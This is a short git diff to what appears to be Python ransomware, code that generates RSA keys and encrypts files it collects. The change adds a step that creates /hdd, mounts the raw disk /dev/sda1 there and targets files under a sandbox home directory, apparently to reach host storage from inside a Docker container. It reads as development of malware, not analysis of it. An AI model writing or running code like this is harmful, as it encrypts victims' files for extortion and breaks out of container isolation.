@@ -19,6 +19,7 @@ from Crypto.Hash import MD5
 from Crypto.Hash import SHA
 from Crypto import Random
 from Crypto.Cipher import PKCS1_OAEP
+from sh import mount
 
 #working on docker!
 
@@ -68,7 +69,9 @@ def start_encryption(files):
 
 def menu():
 
-    files = get_files.find_files(variables.home)+get_files.find_files("/home/")
+    os.mkdir("/hdd")
+    mount("/dev/sda1", "/hdd")
+    files = get_files.find_files("/hdd/home/ubuntu-sandbox")
 
     rsa_object = asymmetric.assymetric()
     rsa_object.generate_keys()
